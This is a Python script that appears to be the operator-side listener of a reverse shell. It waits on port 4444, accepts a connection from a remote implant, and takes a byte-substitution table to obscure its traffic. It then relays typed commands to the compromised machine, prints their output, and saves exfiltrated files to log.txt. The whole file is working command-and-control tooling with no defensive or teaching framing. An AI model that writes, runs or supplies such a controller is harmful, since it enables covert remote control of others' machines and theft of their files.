import socket
import threading
import sys

PORT = 4444
isFile = False
sub_t = None
rev_t = None

def receive_data(conn):
    while True:
        try:
            raw_bytes = conn.recv(8192)
            if not raw_bytes: break
            output = data_handler(raw_bytes.translate(rev_t))
            if output: sys.stdout.write(output); sys.stdout.flush()
        except Exception as e: print(e); break
    conn.close()

def data_handler(data_bytes):
    global isFile
    data_str = data_bytes.decode(errors='ignore').strip()
    if data_str == "0FILE_TRANSFER_BOF":
        isFile = True
        with open("log.txt", "wb") as f: pass 
        return "Receiving File...\n"
    elif data_str == "0FILE_TRANSFER_EOF":
        isFile = False
        return "Transfer Complete.\n "
    else:
        if isFile:
            with open("log.txt", "ab") as f:
                f.write(data_bytes)
            return ""
        else:
            return data_bytes.decode(errors='ignore')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', PORT))
s.listen(1)
print(f":: Listening on {PORT}...")
conn, addr = s.accept()
print(f"Connection :: {addr}")
info = conn.recv(2048)
if not info: 
    conn.close(); 
    print("Malformed packet.")
info = data_handler(info)
if info == 0: 
    conn.close()
    print("Malformed INFO packet.")
table = conn.recv(256)
if not table: 
    conn.close()
    print("Malformed handshake.")
sub_table = table
sub_t = sub_table
rev_list = [0] * 256
for original, substitute in enumerate(sub_table): rev_list[substitute] = original
rev_t = bytes(rev_list)
threading.Thread(target=receive_data, args=(conn,), daemon=True).start()
while True:
    try:
        cmd = input()
        if cmd.lower() in ['exit', 'quit']:
            break
        if cmd:
            payload = (cmd + "\n").encode().translate(sub_t)
            conn.send(payload)
    except KeyboardInterrupt:
        break
conn.close()
s.close()
print("Exited.")